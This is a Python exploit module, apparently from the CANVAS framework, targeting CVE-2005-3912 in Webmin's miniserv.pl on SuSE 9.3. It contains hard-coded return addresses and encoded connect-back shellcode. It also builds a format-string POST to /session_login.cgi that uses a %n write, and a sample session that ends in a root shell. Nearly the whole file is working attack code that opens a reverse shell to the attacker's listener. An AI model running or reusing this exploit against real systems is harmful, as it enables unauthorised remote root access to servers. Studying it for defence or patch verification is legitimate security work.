#! /usr/bin/env python

NOTES="""
Remote trigger for perl efix svarg issue, through webmin miniserv.pl syslog issues.
"""

import sys
sys.path.append(".")
sys.path.append("../../")

import struct
import time

from exploitutils import *
from tcpexploit import *
from encoder import addencoder
import canvasengine
from shellcode import shellcodeGenerator

POC="""

NOTE: Because the payload bounces around a bit, it might take a couple of tries. The
delta however, is robust.


CANVAS$ ./exploits/webmin/webmin.py -v1 -t192.168.1.104 -p10000 -l192.168.1.103 -d8080

...

Command:  shellshock
[!] Turning MOSDEF-Node into temporary interactive shell
[!] Note: will revert back to MOSDEF on "exit"
..........shellshocked!
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=0(root)
sh-3.00# 

"""

# GUI info
NAME="Webmin Remote Exploit"
DESCRIPTION="Remote root exploit for Perl efix svarg index bug, through webmin miniserv.pl"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Webmin.com"
DOCUMENTATION["Date public"] = "11-29-2005 / 12-01-2005"
DOCUMENTATION["OSVDB"] = ""
DOCUMENTATION["References"] = "http://www.dyadsecurity.com/webmin-0001.html - http://www.dyadsecurity.com/perl-0002.html"
DOCUMENTATION["Repeatability"] = ""
DOCUMENTATION["CVE Name"] = "CVE-2005-3912"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3912"
DOCUMENTATION['CVSS'] = 7.5

VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux", "i386"] ]
                                                                                
# VULNERABLE VERSION LIST (Server: )
VULN = ["MiniServ/0.01"]

TARGETS = {
    # name, delta, retloc, retaddr
    0 : ["Autoversioning N/A", 0, 0, 0],
    1 : ["Webmin 1.240 / Perl 5.8.6 (SuSE 9.3)", 0x8002f5e4L, 0x081607ac, 0x0847ec], 
    2 : ["dave Webmin 1.240 / Perl 5.8.6 (SuSE 9.3)", 0x8002f5e4L, 0x081607ac, 0x0847ec]
}

class common:
    def __init__(self):
        return
    
    def connectTo(self, t_host, t_port):
        s = self.gettcpsock()
        try:
            s.connect((t_host, t_port))
        except:
            raise Exception, "Failed to connect"
        return s

class linuxIA32(tcpexploit, common):
    def __init__(self):
        tcpexploit.__init__(self)
        common.__init__(self)
        return

    def createShellcodeLnx86(self, localhost, localport):
        print "[!] connecting back to %s:%s"%(localhost, localport)
        myshellcode = shellcodeGenerator.linux_X86()
        myshellcode.addAttr("connect", {"ipaddress":localhost, "port":localport})
        myshellcode.addAttr("read_and_exec", {"fdreg": "esi"})
        shellcode=myshellcode.get()
        badstring = "\x00\\/.:?\r\n%?\" []&\t=;+-'"
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(badstring)
        self.log("Encoding shellcode")
        shellcode = encoder.encode(shellcode)
        if shellcode == "":
            self.log("Problem encoding shellcode")
            raise Exception, "error encoding shellcode"
        self.log("Shellcode length: %d"%len(shellcode))
        # some nops
        shellcode = "A" * 0x100 + shellcode
        return shellcode
    
    def buildRequestLnx86(self, precision, efix):
        import urllib
        xdata  = "page=%2F"
        # keep in mind we're under url encoding
        myhead=intel_order(self.retloc - 12 + 1 )
        myhead="QQQQ"
        self.log("Using myhead: %s"%prettyhexprint(myhead))
        for i in range(0,500):
            xdata += "&"+myhead+"%d"%i+"="+"R"*1+intel_order(self.retloc - 12 + 1 )+"R"*3

        # !!! 3rd dword is sv_flags ( write is to 0xc(sv))
        # cuz we have a single write, to get the most out of it we do a %n write with 3 bytes
        # we want to set target + 1, and make sure the last byte of our target will be > to point into payload
        xdata += "&user="
        xdata += struct.pack("<L", self.retloc - 12 + 1) + urllib.quote_plus("BBBB" + "CCCC")
        #here is our debugging hook...
        if 1:
            xdata += "A"*len(self.shellcode)
        else:
            #or this..
            #xdata += self.shellcode
            pass
        xdata += urllib.quote_plus("%." + "%d"%precision + "x" + "%%%u"%efix + "$n")

        xdata += "&pass=AAAAAAAAAAAA"

        request  = "POST /session_login.cgi HTTP/1.1\r\n"
        request += "Host: 192.168.1.104:10000\r\n"
        request += "User-Agent: Mozilla/5.0\r\n"
        request += "Keep-Alive: 300\r\n"
        request += "Connection: keep-alive\r\n"
        request += "Cookie: testing=1; sid=01020304010203040102030401020304; x\r\n"
        #for i in range(0, 20000): 
        #    request += "RRRRR: RRRR\r\n"
        request += "Content-Type: application/x-www-form-urlencoded\r\n"
        request += "Content-Length: %d\r\n"%len(xdata) 
        request += "\r\n"

        #print "[!] request:\n\n%s"%request
        #print "[!] body: %s"%xdata

        return (request, xdata)
    
    def tryItLnx86(self, host, port, (request, body)):
        s = self.connectTo(host, port)
        #debugging? Uncomment below
        print "[!] ATTACH"
        sys.stdin.read(1)
        
        print "%d bytes total"%(len(request) + len(body))
        if not s:
            self.log("No socket!")
            return 0
        self.websend(s, request)
        if 0:
            #does timing affect heap layout?
            i=0
            for b in body:
                print "Sending %d out of %d"%(i,len(body))
                self.websend(s, b)
                time.sleep(0.01)
                i+=1
        else:
            self.log("Sending body")
            self.websend(s,body)
            
        #if server sends back "Invalid Username" what does that mean?
        ret = self.webrecv(s)
        ret += self.webrecv(s)
        self.log("Ret=%s"%ret)
        return

class theexploit(linuxIA32):
    def __init__(self):
        linuxIA32.__init__(self)
        self.cmdline = 0
        self.version = 0
        self.host = ""
        self.port = 10000
        self.retloc = 0
        self.delta = 0
        self.retadr = 0
        self.name = ""
        self.shellcode = ""
        return
    
    def test(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))

        s = self.connectTo(self.host,self.port)
        if not s:
            print "[!] could not connect webmin ?"
            return 0

        probe  = "HEAD / HTTP/1.0\r\n"
        probe += "Host: 127.0.0.1\r\n"
        probe += "\r\n"
            
        self.websend(s, probe)

        # little kludge, do a better receive / poll/select
        check = self.webrecv(s)
        check = self.webrecv(s)
        check = self.webrecv(s)

        offset = check.find("Server: ")
        if offset < 0:
            return 0
        server = ""
        while check[offset] != "\r":
            server += check[offset]
            offset+=1
        print "[!] Found: %s"%server
        s.close()
        # VULN CHECK FOR VERSIONS
        for version in VULN:
            if server.find(version) > 0:
                return 1
        return 0
    
    def createShellcode(self):       
        if self.callback:
            host = self.callback.ip
            port = self.callback.port
        else:
            self.log("No callback listener?")
            return ""
        self.shellcode = self.createShellcodeLnx86(host, port)
        return self.shellcode
    
    def neededListenerTypes(self):
        return [canvasengine.LINUXMOSDEF]

    def run(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))

        self.socknode = self.argsDict["passednodes"][0]


        self.name, self.delta, self.retloc, self.retadr = TARGETS[self.version]

        print "[!] Version set to: %s"%self.name        
        if self.version == 0:
            self.log("Sorry, autoversioning not yet available")
            return 0

        self.setInfo("%s running"%NAME)

        prepend = "Non-existent login as "
        # using the 3 ms bytes 
        self.log("Using delta: %x"%self.delta)
        (request, body) = self.buildRequestLnx86(self.retadr - (len(prepend) + 4 + 8 + len(self.shellcode)), self.delta)
        self.tryItLnx86(self.host, self.port, (request, body))

        time.sleep(1)

        self.setInfo("%s done"%NAME)
        if self.ISucceeded():
            return 1
        return 0

    def displayVersions(self):
        i = 0
        for listline in TARGETS.values():
            print "%d : %s"% (i, listline[0])
            i += 1

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

